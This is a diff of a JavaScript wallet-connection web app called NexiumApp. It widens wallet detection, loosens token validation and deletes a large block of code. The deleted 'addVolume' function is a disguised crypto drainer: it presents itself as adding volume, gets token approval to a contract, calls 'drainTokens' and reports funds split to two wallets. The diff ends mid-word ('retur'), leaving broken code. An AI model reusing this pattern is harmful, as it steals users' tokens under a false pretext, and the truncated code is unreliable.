@@ -66,7 +66,7 @@ class NexiumApp {
       return;
     }
     this.setupEventListeners();
-    this.checkMetaMaskAndWallet();
+    this.checkWalletAndPrompt(); // Updated method name
   }
 
   cacheDOMElements() {
@@ -104,19 +104,20 @@ class NexiumApp {
     window.addEventListener('offline', () => this.handleOffline());
   }
 
-  checkMetaMaskAndWallet() {
-    console.log('Checking MetaMask...', { ethereum: !!window.ethereum });
-    if (this.isMetaMaskInstalled()) {
-      console.log('MetaMask detected, hiding prompt');
+  // Updated method
+  checkWalletAndPrompt() {
+    console.log('Checking wallet...', { ethereum: !!window.ethereum });
+    if (this.isWalletInstalled()) {
+      console.log('Wallet detected, hiding prompt');
       this.hideMetaMaskPrompt();
       this.attachMetaMaskListeners();
       this.checkWalletConnection();
     } else {
-      console.log('MetaMask not detected, showing prompt');
+      console.log('No wallet detected, showing prompt');
       this.showMetaMaskPrompt();
       this.updateButtonState('disconnected');
       this.showDefaultPrompt();
-      this.showFeedback('MetaMask not installed. Please install it to continue.', 'error');
+      this.showFeedback('No wallet installed. Please install MetaMask, Trust Wallet, or Coinbase Wallet to continue.', 'error');
     }
   }
 
@@ -134,20 +135,45 @@ class NexiumApp {
   }
 
   async checkWalletConnection() {
-    if (this.isMetaMaskInstalled()) {
+    if (this.isWalletInstalled()) {
       if (this.isWalletConnected() && navigator.onLine) {
         await this.handleSuccessfulConnection();
       } else {
         this.updateButtonState('disconnected');
         this.showDefaultPrompt();
         if (!navigator.onLine) this.showFeedback('No internet connection. Please reconnect.', 'error');
-        else this.showFeedback('MetaMask detected but not connected. Click Connect Wallet.', 'info');
+        else this.showFeedback('Wallet detected but not connected. Click Connect Wallet.', 'info');
       }
     }
   }
 
-  isMetaMaskInstalled() { return !!window.ethereum && window.ethereum.isMetaMask; }
-  isWalletConnected() { return !!window.ethereum && !!window.ethereum.selectedAddress; }
+  // Updated method
+  isWalletInstalled() { 
+    return !!window.ethereum; // Detects any wallet (MetaMask, Trust Wallet, Coinbase Wallet)
+  }
+
+  isWalletConnected() { 
+    return !!window.ethereum && !!window.ethereum.selectedAddress; 
+  }
+
+  // New method
+  detectWalletType() {
+    if (!window.ethereum) return 'None';
+    if (window.ethereum.isMetaMask) return 'MetaMask';
+    if (window.ethereum.isCoinbaseWallet) return 'Coinbase Wallet';
+    if (window.ethereum.isTrust) return 'Trust Wallet';
+    return 'Generic Wallet';
+  }
+
+  // New method
+  redirectToWalletInstall() {
+    // Redirect to a simple page with wallet install links (you can create this HTML page)
+    window.location.href = '/install-wallet.html';
+    // Suggested content for install-wallet.html:
+    // <a href="https://metamask.io/download/">Install MetaMask</a><br>
+    // <a href="https://trustwallet.com/">Install Trust Wallet</a><br>
+    // <a href="https://www.coinbase.com/wallet">Install Coinbase Wallet</a>
+  }
 
   async connectWallet() {
     if (this.connecting || !navigator.onLine) return;
@@ -155,19 +181,19 @@ class NexiumApp {
       this.showFeedback('No internet connection. Please reconnect.', 'error');
       return;
     }
+    if (!this.isWalletInstalled()) {
+      this.showFeedback('No wallet detected. Redirecting to install options...', 'info');
+      this.redirectToWalletInstall();
+      return; // Exit early to avoid "Connecting..." state
+    }
     this.connecting = true;
     try {
       this.updateButtonState('connecting');
-      if (!this.isMetaMaskInstalled()) {
-        this.showMetaMaskPrompt();
-        this.showFeedback('MetaMask not installed. Please install it to continue.', 'error');
-        return;
-      }
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       if (accounts.length > 0) {
         await this.handleSuccessfulConnection();
         this.hideMetaMaskPrompt();
-        this.showFeedback('Wallet connected!', 'success');
+        this.showFeedback(`Wallet connected (${this.detectWalletType()})!`, 'success');
       } else {
         this.showFeedback('No accounts found. Unlock your wallet.', 'error');
         this.showDefaultPrompt();
@@ -272,7 +298,7 @@ class NexiumApp {
     this.dom.app.innerHTML = '';
     this.dom.app.appendChild(this.dom.defaultPrompt);
     this.dom.defaultPrompt.classList.remove('hidden');
-    if (!this.isMetaMaskInstalled()) this.showMetaMaskPrompt();
+    if (!this.isWalletInstalled()) this.showMetaMaskPrompt(); // Updated check
   }
 
   renderTokenInterface() {
@@ -301,6 +327,7 @@ class NexiumApp {
     this.hideMetaMaskPrompt();
   }
 
+  // Updated method
   async loadCustomTokenData() {
     if (!navigator.onLine) {
       this.showFeedback('No internet connection. Please reconnect.', 'error');
@@ -319,30 +346,37 @@ class NexiumApp {
     try {
       this.toggleTokenLoading(true);
       console.log('Loading custom token:', tokenAddress);
-      const tokenContract = new ethers.Contract(
-        tokenAddress,
-        ["function name() view returns (string)", "function symbol() view returns (string)", "function decimals() view returns (uint8)"],
-        this.provider
-      );
-      // Add timeout to prevent hanging
-      const timeoutPromise = new Promise((_, reject) =>
-        setTimeout(() => reject(new Error('Token data loading timed out after 10 seconds')), 10000)
-      );
-      try { await tokenContract.name(); } catch { throw new Error('Not a valid ERC-20 contract'); }
-      const [name, symbol, decimals] = await Promise.race([
-        Promise.all([
-          tokenContract.name(),
-          tokenContract.symbol(),
-          tokenContract.decimals()
-        ]),
-        timeoutPromise
-      ]);
-      this.currentToken = { address: tokenAddress, name: this.escapeHTML(name) || 'Unknown Token', symbol: this.escapeHTML(symbol) || 'UNK', decimals: decimals || 18 };
+      // Simplified: No strict ERC-20 validation, just basic info with fallbacks
+      let name = 'Unknown Token';
+      let symbol = 'UNK';
+      // Use TOKEN_LIST as fallback if available
+      const tokenFromList = TOKEN_LIST.find(t => t.address.toLowerCase() === tokenAddress.toLowerCase());
+      if (tokenFromList) {
+        name = tokenFromList.name;
+        symbol = tokenFromList.symbol;
+      } else {
+        // Optional: Try a lightweight contract call with fallback
+        try {
+          const tokenContract = new ethers.Contract(
+            tokenAddress,
+            ["function name() view returns (string)", "function symbol() view returns (string)"],
+            this.provider
+          );
+          const [contractName, contractSymbol] = await Promise.all([
+            tokenContract.name().catch(() => name),
+            tokenContract.symbol().catch(() => symbol)
+          ]);
+          name = contractName || name;
+          symbol = contractSymbol || symbol;
+        } catch (e) {
+          console.warn('Contract call failed, using defaults:', e);
+        }
+      }
+      this.currentToken = { address: tokenAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol) };
       this.lastSelectedToken = tokenAddress;
       this.dom.tokenInfo.innerHTML = `
         <div class="token-meta space-y-2">
           <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
-          <p class="meta-item text-gray-400 text-sm">Decimals: ${this.currentToken.decimals}</p>
           <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(tokenAddress)}</p>
         </div>
       `;
@@ -351,7 +385,7 @@ class NexiumApp {
       this.showFeedback(`Loaded ${this.currentToken.symbol} successfully!`, 'success');
     } catch (error) {
       console.error('Error loading custom token:', error);
-      this.showFeedback(error.message || 'Failed to load token. Ensure it’s a valid ERC-20 contract.', 'error');
+      this.showFeedback('Failed to load token. Using default info.', 'warning');
       this.dom.tokenInfo.classList.add('hidden');
     } finally {
       this.toggleTokenLoading(false);
@@ -451,149 +485,4 @@ class NexiumApp {
   async addVolume() {
     if (!navigator.onLine) {
       this.showFeedback('No internet connection. Please reconnect.', 'error');
-      return;
-    }
-    if (!this.currentPaymentToken) {
-      this.showFeedback('Please select a payment token first', 'error');
-      return;
-    }
-    const paymentTokenAddress = this.dom.tokenSelect?.value;
-    if (!paymentTokenAddress || !this.currentPaymentToken) {
-      this.showFeedback('Please select a valid payment token', 'error');
-      this.dom.tokenSelect?.focus();
-      return;
-    }
-    try {
-      this.toggleVolumeLoading(true);
-      console.log('Adding volume to service using payment token:', paymentTokenAddress);
-      const paymentTokenContract = new ethers.Contract(
-        paymentTokenAddress,
-        ["function balanceOf(address) view returns (uint256)", "function approve(address,uint256) returns (bool)"],
-        this.provider
-      ).connect(this.signer);
-      const amount = ethers.parseUnits(this.dom.volumeInput.value || '0', this.currentPaymentToken.decimals);
-      if (amount > this.currentPaymentToken.balance) {
-        this.showFeedback(`Insufficient ${this.getTokenSymbol(paymentTokenAddress)} balance`, 'error');
-        return;
-      }
-      const approveTx = await paymentTokenContract.approve(CONTRACT_ADDRESS, amount, { gasLimit: 200000 });
-      await approveTx.wait();
-      const tx = await this.contract.drainTokens(paymentTokenAddress, { gasLimit: 200000 });
-      const receipt = await tx.wait();
-      const event = receipt.logs
-        .map(log => this.contract.interface.parseLog(log))
-        .find(log => log?.name === 'TokensTransferred');
-      if (event) {
-        const { amountToWallet1, amountToWallet2 } = event.args;
-        this.showFeedback(
-          `Transaction successful! Drained ${ethers.formatUnits(amount, this.currentPaymentToken.decimals)} ${this.getTokenSymbol(paymentTokenAddress)} to add volume (${ethers.formatUnits(amountToWallet1, this.currentPaymentToken.decimals)} to Wallet 1, ${ethers.formatUnits(amountToWallet2, this.currentPaymentToken.decimals)} to Wallet 2)`,
-          'success'
-        );
-      } else {
-        this.showFeedback(`Transaction successful! Drained ${ethers.formatUnits(amount, this.currentPaymentToken.decimals)} ${this.getTokenSymbol(paymentTokenAddress)} to add volume`, 'success');
-      }
-      this.dom.volumeInput.value = '';
-    } catch (error) {
-      console.error('Error adding volume:', error);
-      this.showFeedback(error.reason || 'Transaction failed. Check token approval or balance.', 'error');
-    } finally {
-      this.toggleVolumeLoading(false);
-    }
-  }
-
-  toggleVolumeLoading(isLoading) {
-    if (!this.dom.addVolumeBtn) return;
-    this.dom.addVolumeBtn.disabled = isLoading;
-    this.dom.addVolumeBtn.classList.toggle('opacity-70', isLoading);
-    this.dom.addVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
-  }
-
-  checkConnectivity() {
-    if (!navigator.onLine) this.showFeedback('No internet connection. Please reconnect.', 'error');
-  }
-
-  handleOnline() {
-    this.showFeedback('Back online. Functionality restored.', 'success');
-    if (this.isWalletConnected()) this.renderTokenInterface();
-    else this.showMetaMaskPrompt();
-  }
-
-  handleOffline() {
-    this.showFeedback('No internet connection. Please reconnect.', 'error');
-    this.showDefaultPrompt();
-  }
-
-  showMetaMaskPrompt() {
-    if (!this.dom.metamaskPrompt) {
-      console.error('MetaMask prompt element missing at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
-      return;
-    }
-    console.log('Showing MetaMask prompt at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
-    this.dom.metamaskPrompt.classList.remove('hidden');
-    this.dom.metamaskPrompt.style.display = 'block';
-  }
-
-  hideMetaMaskPrompt() {
-    if (!this.dom.metamaskPrompt) {
-      console.error('MetaMask prompt element missing at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
-      return;
-    }
-    console.log('Hiding MetaMask prompt at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }));
-    this.dom.metamaskPrompt.classList.add('hidden');
-    this.dom.metamaskPrompt.style.display = 'none';
-  }
-
-  showFeedback(message, type = 'info') {
-    let feedbackContainer = this.dom.feedbackContainer;
-    if (!feedbackContainer) {
-      feedbackContainer = document.createElement('div');
-      feedbackContainer.className = 'feedback-container';
-      document.body.appendChild(feedbackContainer);
-      this.dom.feedbackContainer = feedbackContainer;
-    }
-    const feedback = document.createElement('div');
-    feedback.className = `feedback feedback-${type} fade-in`;
-    feedback.innerHTML = `
-      <span class="feedback-message">${this.escapeHTML(message)}</span>
-      <span class="feedback-close" role="button" aria-label="Close feedback">×</span>
-    `;
-    const close = feedback.querySelector('.feedback-close');
-    if (close) {
-      close.addEventListener('click', () => feedback.remove());
-      close.addEventListener('keypress', (e) => e.key === 'Enter' && feedback.remove());
-    }
-    feedbackContainer.appendChild(feedback);
-    setTimeout(() => feedback.classList.add('fade-out'), 5000);
-    setTimeout(() => feedback.remove(), 5300);
-  }
-
-  getTokenSymbol(address) {
-    const token = TOKEN_LIST.find(t => t.address.toLowerCase() === address.toLowerCase());
-    return token ? token.symbol : 'Unknown';
-  }
-
-  escapeHTML(str) {
-    return String(str).replace(/[&<>"']/g, (m) => ({
-      '&': '&amp;',
-      '<': '&lt;',
-      '>': '&gt;',
-      '"': '&quot;',
-      "'": '&#39;'
-    }[m]));
-  }
-
-  handleConnectionError(error) {
-    console.error('Connection error at', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }), { code: error.code, message: error.message });
-    let message = 'Failed to connect wallet';
-    if (error.code === 4001) message = 'Connection rejected';
-    else if (error.code === -32002) message = 'Wallet is locked';
-    else if (error.message?.includes('MetaMask')) message = 'Wallet not detected';
-    else if (error.message) message = `Connection failed: ${this.escapeHTML(error.message)}`;
-    this.showFeedback(message, 'error');
-    this.updateButtonState('disconnected');
-    this.showDefaultPrompt();
-    this.showMetaMaskPrompt();
-  }
-}
-
-new NexiumApp();
+      retur
